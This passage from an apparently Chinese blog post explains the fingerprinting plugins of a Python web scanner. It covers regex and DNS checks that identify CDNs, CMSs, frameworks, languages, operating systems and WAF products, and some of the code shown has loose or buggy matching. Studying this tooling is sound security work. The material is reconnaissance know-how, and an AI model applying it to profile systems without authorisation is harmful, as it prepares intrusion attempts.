resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            # 域名拼接上.cdn.cloudflare.net，查询A记录            dns_query = resolver.query(hostname + &quot;.cdn.cloudflare.net&quot;, &#39;A&#39;)            #域名解析正确且至少要返回一个IP，则判断是Akamai CDN            if len(dns_query) &gt; 0:                return &quot;Cloudflare CDN&quot;</code></pre><h4 id="cloudfront-py"><a href="#cloudfront-py" class="headerlink" title="cloudfront.py"></a>cloudfront.py</h4><p>请求hostname查看cname返回包中师傅存在cloudfront.net</p><pre><code class="python">class CloudFront(FingerprintPlugin):    level = Risk.NO_DANGER    def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        _ = False        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            #            dns_query = resolver.query(hostname, &#39;CNAME&#39;)            if len(dns_query) &gt; 0:                #扫描answer字符串中cloudfront.net                for answer in dns_query:                    _ |= re.search(r&#39;cloudfront\.net&#39;, str(answer), re.I) is not None            if _:                return &quot;CloudFront CDN (Amazon)&quot;</code></pre><h4 id="fastly-py"><a href="#fastly-py" class="headerlink" title="fastly.py"></a>fastly.py</h4><p>请求hostname查看cname返回包中师傅存在fastly.net</p><pre><code class="python">def process(self, headers, content):        request = Services.get(&#39;request_factory&#39;)        hostname = urlparse(request.url).hostname        _ = False        try:            resolver = Resolver(configure=False)            resolver.nameservers = [settings.dns_resolver]            resolver.timeout = 2            resolver.lifetime = 2            dns_query = resolver.query(hostname, &#39;CNAME&#39;)            if len(dns_query) &gt; 0:                for answer in dns_query:                    _ |= re.search(r&#39;fastly\.net&#39;, str(answer), re.I) is not None            if _:                return &quot;Fastly CDN&quot;</code></pre><h3 id="cms指纹识别"><a href="#cms指纹识别" class="headerlink" title="cms指纹识别"></a>cms指纹识别</h3><p>CMS识别原理就是得到一些CMS的一些固有特征，通过得到这个特征来判断CMS的类别。</p><h4 id="Drupal"><a href="#Drupal" class="headerlink" title="Drupal"></a>Drupal</h4><p>三个search任意一个结果为1 _就是true，然后返回时drupal cms</p><p>但是这里问题很大：有部分开发者会除自带的Drupal.settings</p><p><a href="https://www.yangshengliang.com/jianzhanxitong/drupal/1407.html" target="_blank" rel="external">drupal 7 移除自带的 css 和 javascript 及jQuery.extend(Drupal.settings,</a></p><p>drupal7后第二条匹配规则就算是失效了。</p><p>三条匹配规则还需要添加</p><pre><code class="python">class Drupal(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:            #使用 Python 的原始字符串，只需加一个 r 前缀            # | 指明两项之间的一个选择            #在url中寻找/misc/drupal.js或者content中是否有power by Drupal这样去检测drupal            _ = re.search(r&#39;src=&quot;\S*/misc/drupal.js*|Powered by Drupal, an open source content management system&#39;,                          content) is not None            #\S匹配任何非空白字符 jQuery中Drupal.extend            #扫描content中匹配存在/misc/drupal.css或jQuery中的Drupal.settings或Drupal.extend            _ |= re.search(r&#39;\S*/misc/drupal.css&quot;|jQuery.extend\WDrupal.settings|Drupal.extend\W&#39;, content) is not None            #匹配meta标签存在name=&quot;Generator&quot; content=&quot;Drupal&#39;            _ |= re.search(r&#39;&lt;meta name=&quot;Generator&quot; content=&quot;Drupal&#39;, content) is not None            if _:                return &quot;Drupal&quot;        except Exception as e:            print(e)</code></pre><h4 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h4><p>两重判断</p><pre><code class="python">class Joomla(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:            #匹配url中的/index.php?option= 或 meta标签name=&quot;generator&quot; content=&quot;Joomla 或匹配 源码存在Powered by &lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt;            _ = re.search(                r&#39;/index.php?option=(\S*)|&lt;meta name=&quot;generator&quot; content=&quot;Joomla*|Powered by &lt;a href=&quot;http://www.joomla.org&quot;&gt;Joomla!&lt;/a&gt;*&#39;,                content) is not None            if _:                #二次判断是否存在/templates/目录，re.I忽略大小写                if re.search(&#39;/templates/*&#39;, content, re.I):                    return &quot;Joomla&quot;        except Exception as e:            print(e)</code></pre><h4 id="magento"><a href="#magento" class="headerlink" title="magento"></a>magento</h4><pre><code class="python">class Magento(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:          #页面特征较多，做一个循环判断，主要原理是网页中发现关键字            for x in (&#39;x-magento-init&#39;, &#39;Magento_*&#39;, &#39;images/logo.gif&quot; alt=&quot;Magento Commerce&quot; /&gt;&lt;/a&gt;&lt;/h1&gt;&#39;,                      &#39;&lt;a href=&quot;http://www.magentocommerce.com/bug-tracking&quot; id=&quot;bug_tracking_link&quot;&gt;&lt;strong&gt;Report All Bugs&lt;/strong&gt;&lt;/a&gt;&#39;,                      &#39;&lt;meta name=&quot;keywords&quot; content=&quot;Magento, Varien, E-commerce&quot; /&gt;&#39;, &#39;mage/cookies.js&quot; &gt;&lt;/script&gt;&#39;,                      &#39;&lt;div id=&quot;noscript-notice&quot; class=&quot;magento-notice&quot;&gt;&#39;):                #判断_是true                _ = re.search(x, content) is not None                if _:                    return &quot;Magento&quot;        except Exception as e:            print(e)</code></pre><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><p>结构特征. Web应用的类型可由其特殊的结构设计准确识别, 该指纹只需从HTML数据的头部获取. 例如, 如果Web应用的文件路径包含/wp-includes/, 则该Web应用是Wordpress.</p><pre><code class="python">class Wordpress(FingerprintPlugin):    def process(self, headers, content):        _ = False        try:            #循环寻找指定URL的关键字来判断是否存在各个Wordpress的url文件夹            for x in (&#39;/wp-admin/&#39;, &#39;/wp-content/&#39;, &#39;/wp-includes/&#39;, &#39;&lt;meta name=&quot;generator&quot; content=&quot;WordPress&#39;):                _ = re.search(x, content) is not None            if _:                return &quot;Wordpress&quot;        except Exception as e:            print(e)</code></pre><h3 id="framework指纹识别"><a href="#framework指纹识别" class="headerlink" title="framework指纹识别"></a>framework指纹识别</h3><p>在framework下面对更多种类的框架进行了识别。这里倒是可以自己增加一些额外的框架识别代码，进行扩充。</p><pre><code>│   │   │   ├── framework│   │   │   │   ├── cakephp.py│   │   │   │   ├── cherrypy.py│   │   │   │   ├── dancer.py│   │   │   │   ├── django.py│   │   │   │   ├── flask.py│   │   │   │   ├── fuelphp.py│   │   │   │   ├── grails.py│   │   │   │   ├──` __init__.py`│   │   │   │   ├── laravel.py│   │   │   │   ├── mvc.py│   │   │   │   ├── nette.py│   │   │   │   ├── phalcon.py│   │   │   │   ├── rails.py│   │   │   │   ├── symfony.py│   │   │   │   ├── yii.py│   │   │   │   └── zend.py</code></pre><h4 id="cakephp"><a href="#cakephp" class="headerlink" title="cakephp"></a>cakephp</h4><p> 原理： header特别字段cakephp=的正则匹配</p><pre><code class="python">class Cakephp(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有cakephp=            _ = re.search(r&#39;cakephp=&#39;, item[1], re.I) is not None            if _:                return &quot;CakePHP (PHP)&quot;</code></pre><h4 id="cherrypy"><a href="#cherrypy" class="headerlink" title="cherrypy"></a>cherrypy</h4><p> 原理： header特别字段CherryPy的正则匹配</p><pre><code class="python">class Cherrypy(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配headers中value值是否有CherryPy        for item in headers.items():            _ = re.search(r&#39;CherryPy&#39;, item[1], re.I) is not None            if _:                return &quot;CherryPy (Python)&quot;</code></pre><h4 id="dancer"><a href="#dancer" class="headerlink" title="dancer"></a>dancer</h4><p> 原理：header特别字段Dancer和dancer.session的正则匹配</p><pre><code class="python">class Dancer(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有Dancer或存在dancer.session            _ |= re.search(r&#39;Dancer|dancer\.session=.*&#39;, item[1], re.I) is not None        if _:            return &quot;Dancer (Perl)&quot;</code></pre><h4 id="django"><a href="#django" class="headerlink" title="django"></a>django</h4><p> 原理：header特别字段csrftoken的正则匹配</p><pre><code class="python">class Django(FingerprintPlugin):    def process(self, headers, content):        _ = False        #csrftoken是django中防止csrf的机制        for item in headers.items():            _ = re.search(r&#39;csrftoken=&#39;, item[1], re.I) is not None            if _:                return &quot;Django (Python)&quot;</code></pre><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><p> 原理： header特别字段flask的正则匹配</p><pre><code class="python">class Flask(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配header头value值是否有flask            _ = re.search(r&#39;flask&#39;, item[1], re.I) is not None            if _:                return &quot;Flask (Python)&quot;</code></pre><h4 id="fuelphp"><a href="#fuelphp" class="headerlink" title="fuelphp"></a>fuelphp</h4><p> 原理： header特别字段fuelcid= 或者 content特别字段Powered by <code>&lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt;</code>的正则匹配</p><pre><code class="python">class Fuelphp(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            ##header头value值匹配fuelcid=            _ = re.search(r&#39;fuelcid=&#39;, item[1], re.I) is not None            #两个匹配规则 按位或运算符,如果content中匹配存在Powered by &lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt; 那么_判定为true            _ |= re.search(r&#39;Powered by &lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt;&#39;, content) is not None            if _:                return &quot;FuelPHP (PHP)&quot;</code></pre><h4 id="grails"><a href="#grails" class="headerlink" title="grails"></a>grails</h4><p> 原理：header key值和value值的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190225142058.png" alt=""></p><p>headers的代码形式{‘k1’:’v1’, ‘k2’:’v2’}</p><p>item是个list,遍历出来的item是个二元数组 (‘k1’, ‘v1’)</p><p>item[0]是key值，item[1]是value值 </p><pre><code class="python">class Grails(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #遍历header头匹配value值是Grails            _ = re.search(r&#39;Grails&#39;, item[1], re.I) is not None            #遍历header头匹配key值是X-Grails或X-Grails-Cached            _ |= re.search(r&#39;X-Grails|X-Grails-Cached&#39;, item[0], re.I) is not None            if _:                return &quot;Grails (Java)&quot;</code></pre><h4 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h4><p> 原理： header字段的value值特别为laravel_session=的正则匹配</p><pre><code class="python">class Laravel(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #header头value值匹配laravel_session=            _ = re.search(r&#39;laravel_session=&#39;, item[1], re.I) is not None            if _:                return &quot;Laravel (PHP)&quot;</code></pre><h4 id="mvc"><a href="#mvc" class="headerlink" title="mvc"></a>mvc</h4><p> 原理：header特别字段的正则匹配</p><pre><code class="python">class Mvc(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配response headers中是否有x-aspnetmvc-version或__requestverificationtoken            _ = re.search(r&#39;x-aspnetmvc-version|__requestverificationtoken&#39;, str(item), re.I) is not None            if _:                return &quot;ASP.NET MVC&quot;</code></pre><h4 id="nette"><a href="#nette" class="headerlink" title="nette"></a>nette</h4><p> 原理： header特别字段<code>nette*或nette-browser=*</code>的正则匹配</p><pre><code class="python">class Nette(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers头中value值是否有nette*或nette-browser=*            _ = re.search(r&#39;nette*|nette-browser=*&#39;, item[1], re.I) is not None            if _:                return &quot;Nette (PHP)&quot;</code></pre><h4 id="phalcon"><a href="#phalcon" class="headerlink" title="phalcon"></a>phalcon</h4><p> 原理：header特别字段<code>phalcon-auth-*或Phalcon [(https://phalconphp.com/)]*</code>的正则匹配</p><pre><code class="python">class Phalcon(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers头中value值是否有phalcon-auth-*或Phalcon [(https://phalconphp.com/)]*            _ = re.search(r&#39;phalcon-auth-*&#39;, item[1], re.I) is not None            _ |= re.search(r&#39;Phalcon [(https://phalconphp.com/)]*&#39;, item[1]) is not None            if _:                return &quot;Phalcon (C and PHP)&quot;</code></pre><h4 id="rails"><a href="#rails" class="headerlink" title="rails"></a>rails</h4><p> 原理：header key值和value值的正则匹配</p><pre><code class="python">class Rails(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #遍历header头匹配value值是Grails            _ = re.search(r&#39;rails*|_rails_admin_session=*|x-rails&#39;, item[1], re.I) is not None            #遍历header头匹配key值是rails*或x-rails            _ |= re.search(r&#39;rails*|x-rails&#39;, item[0], re.I) is not None            if _:                return &quot;Rails (Ruby)&quot;</code></pre><h4 id="symfony"><a href="#symfony" class="headerlink" title="symfony"></a>symfony</h4><p> 原理： header特别字段symfony=*的正则匹配</p><pre><code class="python">class Symfony(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有symfony=*            _ = re.search(r&#39;symfony=*&#39;, item[1], re.I) is not None            if _:                return &quot;Symfony PHP&quot;</code></pre><h4 id="yii"><a href="#yii" class="headerlink" title="yii"></a>yii</h4><p> 原理： header特别字段_csrf=* 或者 匹配content特别字段Powered by <code>&lt;a href=&quot;http://fuelphp.com&quot;&gt;FuelPHP&lt;/a&gt;</code>的正则匹配</p><pre><code class="python">class Yii(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有_csrf=*            _ = re.search(r&#39;_csrf=*&#39;, item[1], re.I) is not None            #或者匹配content中存在Powered by &lt;a href=&quot;http://www.yiiframework.com/&quot; rel=&quot;external&quot;&gt;Yii Framework&lt;/a&gt;            _ |= re.search(r&#39;Powered by &lt;a href=&quot;http://www.yiiframework.com/&quot; rel=&quot;external&quot;&gt;Yii Framework&lt;/a&gt;&#39;,                           content) is not None            if _:                return &quot;Yiiframework (PHP)&quot;</code></pre><h4 id="zend"><a href="#zend" class="headerlink" title="zend"></a>zend</h4><p>原理： header特别字段<code>Zend</code>的正则匹配</p><pre><code class="python">class Zend(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有Zend            _ = re.search(r&#39;Zend&#39;, item[1], re.I) is not None            if _:                return &quot;Zend (PHP)&quot;</code></pre><h3 id="fronted指纹识别"><a href="#fronted指纹识别" class="headerlink" title="fronted指纹识别"></a>fronted指纹识别</h3><p>前端框架指纹识别</p><pre><code>│   │   │   ├── frontend│   │   │   │   ├── angularjs.py│   │   │   │   ├── emberjs.py│   │   │   │   ├── __init__.py│   │   │   │   ├── jquery.py│   │   │   │   ├── knockout.py│   │   │   │   ├── meteorjs.py│   │   │   │   ├── mootools.py│   │   │   │   ├── prototype.py│   │   │   │   ├── reactjs.py│   │   │   │   └── vuejs.py</code></pre><h4 id="angularjs"><a href="#angularjs" class="headerlink" title="angularjs"></a>angularjs</h4><p>原理：三条匹配规则 有一则规则触发就是AngularJS，主要依靠content特别字段的正则匹配</p><pre><code class="python">class Angularjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #re.I:忽略大小写 匹配content中是否有ng-app        _ = re.search(r&#39;ng-app&#39;, content, re.I) is not None        #或者匹配content中是否有ng-version        _ |= re.search(r&#39;ng-version&#39;, content, re.I) is not None        #或者匹配content中是否有app-root        _ |= re.search(r&#39;app-root&#39;, content, re.I) is not None        if _:            return &quot;AngularJS (Google)&quot;</code></pre><h4 id="emberjs"><a href="#emberjs" class="headerlink" title="emberjs"></a>emberjs</h4><p>原理：主要依靠原理： header特别字段的正则匹配</p><pre><code class="python">class Emberjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的value值是否有ember-view            _ = re.search(r&#39;ember-view&#39;, item[1], re.I) is not None            if _:                return &quot;EmberJs (Javascript)&quot;</code></pre><h4 id="jquery"><a href="#jquery" class="headerlink" title="jquery"></a>jquery</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Jquery(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有jquery-[0-9\-\.]+.js或者存在jquery        #举例子:jquery-5.js        _ = re.search(r&#39;jquery-[0-9\-\.]+.js|jquery&#39;, content, re.I) is not None        if _:            return &quot;JQuery (Javascript)&quot;</code></pre><h4 id="knockout"><a href="#knockout" class="headerlink" title="knockout"></a>knockout</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Knockout(FingerprintPlugin):    def process(self, headers, content):        _ = False        #举例子knockout-5-..js        #匹配content中是否有knockout-[0-9\-\.]+.js        _ = re.search(r&#39;knockout-[0-9\-\.]+.js&#39;, content, re.I) is not None        if _:            return &quot;Knockout (Javascript)&quot;</code></pre><h4 id="meteorjs"><a href="#meteorjs" class="headerlink" title="meteorjs"></a>meteorjs</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code>class Meteorjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有__meteor_runtime_config__        _ = re.search(r&#39;__meteor_runtime_config__&#39;, content, re.I) is not None        if _:            return &quot;MeteorJS (Javascript)&quot;</code></pre><h4 id="mootools"><a href="#mootools" class="headerlink" title="mootools"></a>mootools</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Mootools(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有MooTools-[0-9\-\.]+.js        _ = re.search(r&#39;MooTools-[0-9\-\.]+.js&#39;, content, re.I) is not None        if _:            return &quot;MooTools (Javascript)&quot;</code></pre><h4 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Prototype(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有prototype-[0-9\-\.]+.js或者prototype.js        _ = re.search(r&#39;prototype.js&#39;, content, re.I) is not None        _ |= re.search(r&#39;prototype-[0-9\-\.]+.js&#39;, content, re.I) is not None        if _:            return &quot;Prototype (Javascript)&quot;</code></pre><h4 id="reactjs"><a href="#reactjs" class="headerlink" title="reactjs"></a>reactjs</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Reactjs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有react-[0-9\-\.]+.js或者reactroot或者reactid        _ = re.search(r&#39;react-[0-9\-\.]+.js&#39;, content, re.I) is not None        _ = re.search(r&#39;reactroot|reactid&#39;, content, re.I) is not None        if _:            return &quot;ReactJS (Javascript)&quot;</code></pre><h4 id="vuejs"><a href="#vuejs" class="headerlink" title="vuejs"></a>vuejs</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Vuejs(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有v-bind或者v-for或者v-if        _ |= re.search(r&#39;v-bind|v-for|v-if&#39;, content, re.I) is not None        if _:            return &quot;VueJS (Javascript)&quot;</code></pre><h3 id="lang指纹识别"><a href="#lang指纹识别" class="headerlink" title="lang指纹识别"></a>lang指纹识别</h3><p> 对采用何种编程语言的识别</p><pre><code>│   │   │   ├── lang│   │   │   │   ├── asp.py│   │   │   │   ├── __init__.py│   │   │   │   ├── java.py│   │   │   │   ├── perl.py│   │   │   │   ├── php.py│   │   │   │   ├── python.py│   │   │   │   └── ruby.py</code></pre><p> 对采用何种编程语言的识别有点意思，也是response header和content部分特别字段的正则匹配。</p><p>看下python语言的识别。lang/python.py:</p><h4 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h4><p>原理：主要依靠header和content特别字段的正则匹配</p><pre><code class="python">class Asp(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            ##匹配header中是否有ASP.NET或X-AspNet-Version或x-aspnetmvc-version            _ = re.search(r&#39;ASP.NET|X-AspNet-Version|x-aspnetmvc-version&#39;, str(item), re.I) is not None            #\W匹配非字母字符，即匹配特殊字符。匹配content是否有__VIEWSTATE， \W匹配非字母字符，即匹配特殊字符            if not _:                _ |= re.search(r&#39;(__VIEWSTATE\W*)&#39;, content) is not None            #$：匹配字符串末尾 匹配content是否有.asp或者aspx            if not _:                _ |= re.search(r&#39;\.asp$|\.aspx$&#39;, content) is not None            if _:                return &quot;ASP.NET&quot;</code></pre><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><p>原理：主要依靠header和content特别字段的正则匹配</p><pre><code class="python">class Java(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            ##匹配headers中的是否有Java或Servlet或JSP或JBoss或Glassfish或Oracle或JRE或JDK|或SESSIONID            _ = re.search(r&#39;Java|Servlet|JSP|JBoss|Glassfish|Oracle|JRE|JDK|JSESSIONID&#39;, str(item)) is not None            if not _:                #匹配content中字符串的末尾存在.jsp或.jspx或.do或.wss或.action                _ |= re.search(r&#39;\.jsp$|\.jspx$|.do$|\.wss$|\.action$&#39;, content) is not None            if _:                return &quot;Java&quot;</code></pre><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Perl(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中字符串的末尾存在.pl或.cgi        _ = re.search(r&#39;\.pl$|\.cgi$&#39;, content) is not None        if _:            return &quot;Perl&quot;</code></pre><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>原理：主要依靠header和content特别字段的正则匹配</p><pre><code class="python">class Php(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有X-PHP-PID或PHP2、php3、php4等 或 PHPSESSID            _ = re.search(r&#39;X-PHP-PID|PHP\S*|PHPSESSID&#39;, str(item)) is not None            #匹配content中字符串的末尾存在.php或.phtml        _ |= re.search(r&#39;\.php$|\.phtml$&#39;, content) is not None        if _:            return &quot;PHP&quot;</code></pre><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><p>原理：主要依靠 header和content特别字段的正则匹配</p><pre><code class="python">class Python(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有python或zope或zserver或wsgi或plone或_ZopeId            _ = re.search(r&#39;python|zope|zserver|wsgi|plone|_ZopeId&#39;, item[1], re.I) is not None        #匹配content中字符串的末尾存在.py        _ |= re.search(r&#39;\.py$&#39;, content) is not None        if _:            return &quot;Python&quot;</code></pre><h4 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h4><p>原理：主要依靠response header和content特别字段的正则匹配</p><pre><code class="python">class Ruby(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有mod_rack或phusion或passenger            _ = re.search(r&quot;mod_rack|phusion|passenger&quot;, item[1], re.I) is not None        #匹配content中字符串的末尾存在.rb或.rhtml        _ |= re.search(r&#39;\.rb$|\.rhtml$&#39;, content) is not None        if _:            return &quot;Ruby&quot;</code></pre><h3 id="system指纹识别"><a href="#system指纹识别" class="headerlink" title="system指纹识别"></a>system指纹识别</h3><p>这个识别还是很粗糙的，因为很多时候http response里面server部分有时候没内容，然后os部分有时候也没有内容。</p><h4 id="bsd"><a href="#bsd" class="headerlink" title="bsd"></a>bsd</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Bsd(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配headers中的是否有任何非空白字符+BSD        for item in headers.items():            _ = re.search(r&#39;\S*BSD&#39;, str(item), re.I) is not None            if _:                return &quot;BSD&quot;</code></pre><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Linux(FingerprintPlugin):    def process(self, headers, content):        for item in headers.items():            #re.findall匹配的全部字串，返回形式为数组            _ = re.findall(          r&#39;linux|ubuntu|gentoo|debian|dotdeb|centos|redhat|sarge|etch|lenny|squeeze|wheezy|jessie|red hat|scientific linux&#39;,                str(item), re.I)            #如果匹配到两个则返回第一个匹配到的，如果匹配一个或者两个以上也返回第一个匹配到的            if _:                if len(_) == 2:                    return _[0]                else:                    return _[0]</code></pre><h4 id="mac"><a href="#mac" class="headerlink" title="mac"></a>mac</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Mac(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有Mac或MacOS或非空白字符MacOS*            _ = re.search(r&#39;Mac|MacOS|MacOS\S*&#39;, str(item)) is not None            if _:                return &quot;MacOS&quot;</code></pre><h4 id="solaris"><a href="#solaris" class="headerlink" title="solaris"></a>solaris</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Solaris(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有solaris或sunos或opensolaris或sparc64或sparc            _ = re.search(r&#39;solaris|sunos|opensolaris|sparc64|sparc&#39;, str(item), re.I) is not None            if _:                return &quot;Solaris&quot;</code></pre><h4 id="unix"><a href="#unix" class="headerlink" title="unix"></a>unix</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Unix(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有unix            _ = re.search(r&#39;unix&#39;, str(item), re.I) is not None            if _:                return &quot;Unix&quot;</code></pre><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Windows(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中的是否有windows或win32            _ = re.search(r&#39;windows|win32&#39;, str(item), re.I) is not None            if _:                return &quot;Windows&quot;</code></pre><h3 id="waf指纹识别"><a href="#waf指纹识别" class="headerlink" title="waf指纹识别"></a>waf指纹识别</h3><pre><code>│   │   │   └── waf│   │   │       ├── airlock.py│   │   │       ├── anquanboa.py│   │   │       ├── aws.py│   │   │       ├── baidu.py│   │   │       ├── barracuda.py│   │   │       ├── bigip.py│   │   │       ├── binarysec.py│   │   │       ├── blockdos.py│   │   │       ├── chinacache.py│   │   │       ├── ciscoacexml.py│   │   │       ├── cloudflare.py│   │   │       ├── cloudfront.py│   │   │       ├── dotdefender.py│   │   │       ├── edgecast.py│   │   │       ├── fortiweb.py│   │   │       ├── hyperguard.py│   │   │       ├── incapsula.py│   │   │       ├── __init__.py│   │   │       ├── isaserver.py│   │   │       ├── kona.py│   │   │       ├── modsecurity.py│   │   │       ├── netcontinuum.py│   │   │       ├── paloalto.py│   │   │       ├── profense.py│   │   │       ├── radware.py│   │   │       ├── requestvalidationmode.py│   │   │       ├── safedog.py│   │   │       ├── secureiis.py│   │   │       ├── sengnix.py│   │   │       ├── sitelock.py│   │   │       ├── sonicwall.py│   │   │       ├── sucuri.py│   │   │       ├── trafficshield.py│   │   │       ├── varnish.py│   │   │       ├── wallarm.py│   │   │       └── webknight.py</code></pre><h4 id="airlock"><a href="#airlock" class="headerlink" title="airlock"></a>airlock</h4><p>原理：主要依靠header特别字段的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190226094050.png" alt=""></p><pre><code class="python">class Airlock(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有^AL[_-]SESS[_-]S=\S*            _ = re.search(r&#39;^AL[_-]SESS[_-]S=\S*&#39;, item[1], re.I) is not None            #匹配headers中key值的是否有X-Airlock-Test            _ |= re.search(r&#39;X-Airlock-Test&#39;, item[0], re.I) is not None            if _:                return &quot;InfoGuard Airlock (Phion/Ergon)&quot;</code></pre><h4 id="anquanboa"><a href="#anquanboa" class="headerlink" title="anquanboa"></a>anquanboa</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Anquanboa(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有X-Powered-By-Anquanbao            _ = re.search(r&#39;X-Powered-By-Anquanbao&#39;, item[0], re.I) is not None            if _:                return &quot;Anquanbao Firewall&quot;</code></pre><h4 id="aws"><a href="#aws" class="headerlink" title="aws"></a>aws</h4><p>原理：三条匹配规则，主要依靠header特别字段的正则匹配</p><pre><code class="python">class Aws(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有aws*            _ = re.search(r&#39;aws*&#39;, item[1], re.I) is not None            #匹配headers中key值是否有x-amz-id-0、x-amz-id-1、x-amz-id-2            _ |= re.search(r&#39;x-amz-id-[0-2]&#39;, item[0], re.I) is not None            #匹配headers中key值是否有x-amz-request-id            _ |= re.search(r&#39;x-amz-request-id&#39;, item[0], re.I) is not None            if _:                return &#39;Amazon Web Services Web Application Firewall (Amazon)&#39;</code></pre><h4 id="baidu"><a href="#baidu" class="headerlink" title="baidu"></a>baidu</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Baidu(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有yunjiasu-nginx            _ = re.search(r&#39;yunjiasu-nginx&#39;, item[1], re.I) is not None            #匹配headers中value值是否有YJS-ID            _ |= re.search(r&#39;YJS-ID&#39;, item[1], re.I) is not None            #匹配headers中value值是否有fhl            _ |= re.search(r&#39;fhl&#39;, item[1], re.I) is not None            if _:                return &quot;Yunjiasu Web Application Firewall (Baidu)&quot;</code></pre><h4 id="barracuda"><a href="#barracuda" class="headerlink" title="barracuda"></a>barracuda</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Barracuda(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有barracuda*            _ = re.search(r&#39;barracuda*&#39;, item[1], re.I) is not None            #匹配headers中value值是否有barra_counter_session=            _ |= 